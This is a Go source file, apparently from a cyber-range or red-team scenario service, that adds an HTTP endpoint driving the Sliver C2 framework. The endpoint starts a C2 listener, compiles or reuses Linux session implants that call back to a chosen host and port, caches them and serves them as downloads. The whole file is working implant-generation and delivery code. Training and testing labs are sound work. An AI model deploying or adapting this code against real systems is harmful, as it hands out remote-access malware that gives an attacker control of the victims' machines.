package api

// implant.go — GET /api/v1/implant/linux
//
// On first request this handler:
//   1. Checks if a matching Linux amd64 HTTP session implant already exists in
//      Sliver's build cache (ImplantBuilds).  If so, serves it immediately via
//      Regenerate (avoids recompilation, ~instant).
//   2. Otherwise calls Generate with HTTPC2ConfigName:"default" to compile a
//      fresh implant (~1-2 min).  Generate is synchronous and returns the
//      binary directly on success.
//   3. Caches the binary in-process so subsequent requests are instant.
//
// Query parameters (all optional):
//   arch   amd64 (default) | arm64
//   c2     C2 host the beacon calls back to (default: C2_HOST env or 172.20.0.10)
//   port   HTTP listener port (default: 80)

import (
	"context"
	"fmt"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
)

const (
	defaultC2Host       = "172.20.0.10"
	defaultListenerPort = uint32(80)
	buildTimeout        = 15 * time.Minute
)

// implantCache holds a generated implant binary per (arch, c2host, port) key.
type implantCache struct {
	mu    sync.Mutex
	cache map[string][]byte
}

var globalImplantCache = &implantCache{cache: make(map[string][]byte)}

// handleGetImplantLinux serves a generated Linux session binary.
func (s *Server) handleGetImplantLinux(w http.ResponseWriter, r *http.Request) {
	arch := r.URL.Query().Get("arch")
	if arch == "" {
		arch = "amd64"
	}
	c2Host := r.URL.Query().Get("c2")
	if c2Host == "" {
		c2Host = s.c2Host
	}
	portStr := r.URL.Query().Get("port")
	port := defaultListenerPort
	if portStr != "" {
		if p, err := strconv.ParseUint(portStr, 10, 32); err == nil {
			port = uint32(p)
		}
	}

	c2URL := fmt.Sprintf("http://%s:%d", c2Host, port)
	cacheKey := fmt.Sprintf("%s_%s_%d", arch, c2Host, port)

	globalImplantCache.mu.Lock()
	if data, ok := globalImplantCache.cache[cacheKey]; ok {
		globalImplantCache.mu.Unlock()
		serveImplant(w, data, "sliver-session-linux-"+arch)
		return
	}
	globalImplantCache.mu.Unlock()

	if err := s.ensureHTTPListener(c2Host, port); err != nil {
		log.Printf("[implant] ensureHTTPListener: %v", err)
		writeError(w, http.StatusInternalServerError, "could not start HTTP listener: "+err.Error())
		return
	}

	// Reuse an existing build if available (avoids recompilation).
	var data []byte
	if buildName, err := s.findMatchingBuild(arch, c2URL); err == nil && buildName != "" {
		log.Printf("[implant] Reusing existing build: %s", buildName)
		ctx, cancel := context.WithTimeout(r.Context(), 2*time.Minute)
		defer cancel()
		regen, err := s.rpc.Regenerate(ctx, &clientpb.RegenerateReq{ImplantName: buildName})
		if err == nil && regen.File != nil && len(regen.File.Data) > 0 {
			data = regen.File.Data
		}
	}

	if data == nil {
		// Compile a fresh implant — takes ~1-2 min but is synchronous.
		log.Printf("[implant] Compiling linux/%s session implant → %s (this takes ~1-2 min)…", arch, c2URL)
		ctx, cancel := context.WithTimeout(r.Context(), buildTimeout)
		defer cancel()

		resp, err := s.rpc.Generate(ctx, &clientpb.GenerateReq{
			Config: &clientpb.ImplantConfig{
				GOOS:             "linux",
				GOARCH:           arch,
				Format:           clientpb.OutputFormat_EXECUTABLE,
				IsBeacon:         false,
				HTTPC2ConfigName: "default",
				C2: []*clientpb.ImplantC2{
					{Priority: 0, URL: c2URL},
				},
			},
		})
		if err != nil {
			log.Printf("[implant] Generate RPC error: %v", err)
			writeError(w, http.StatusInternalServerError, "implant generation failed: "+err.Error())
			return
		}
		if resp.File == nil || len(resp.File.Data) == 0 {
			writeError(w, http.StatusInternalServerError, "implant generation returned empty binary")
			return
		}
		data = resp.File.Data
		log.Printf("[implant] Compiled linux/%s session implant (%d bytes)", arch, len(data))
	}

	globalImplantCache.mu.Lock()
	globalImplantCache.cache[cacheKey] = data
	globalImplantCache.mu.Unlock()

	serveImplant(w, data, "sliver-session-linux-"+arch)
}

// findMatchingBuild looks through existing ImplantBuilds for one matching
// the requested arch and C2 URL.  Returns "" if none is found.
func (s *Server) findMatchingBuild(arch, c2URL string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	builds, err := s.rpc.ImplantBuilds(ctx, &commonpb.Empty{})
	if err != nil {
		return "", err
	}
	for name, cfg := range builds.GetConfigs() {
		if cfg.GetGOOS() != "linux" || cfg.GetGOARCH() != arch {
			continue
		}
		for _, c2 := range cfg.GetC2() {
			if strings.EqualFold(c2.GetURL(), c2URL) {
				return name, nil
			}
		}
	}
	return "", nil
}

// ensureHTTPListener starts a Sliver HTTP listener on c2Host:port if one is
// not already present.
func (s *Server) ensureHTTPListener(host string, port uint32) error {
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	jobs, err := s.rpc.GetJobs(ctx, &commonpb.Empty{})
	if err != nil {
		return fmt.Errorf("GetJobs: %w", err)
	}
	for _, j := range jobs.Active {
		if (j.Protocol == "http" || j.Protocol == "tcp") && uint32(j.Port) == port {
			log.Printf("[implant] HTTP listener already running on port %d", port)
			return nil
		}
	}

	ctx2, cancel2 := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel2()

	_, err = s.rpc.StartHTTPListener(ctx2, &clientpb.HTTPListenerReq{
		Host: host,
		Port: port,
	})
	if err != nil {
		return fmt.Errorf("StartHTTPListener: %w", err)
	}
	log.Printf("[implant] Started HTTP listener on %s:%d", host, port)
	return nil
}

func serveImplant(w http.ResponseWriter, data []byte, filename string) {
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, filename))
	w.Header().Set("Content-Length", strconv.Itoa(len(data)))
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write(data)
}

// c2HostFromEnv returns the C2 host from SCENARIO_C2_HOST / C2_HOST env vars,
// falling back to the Docker network default.
func c2HostFromEnv() string {
	for _, k := range []string{"SCENARIO_C2_HOST", "C2_HOST"} {
		if v := os.Getenv(k); v != "" {
			return v
		}
	}
	return defaultC2Host
}
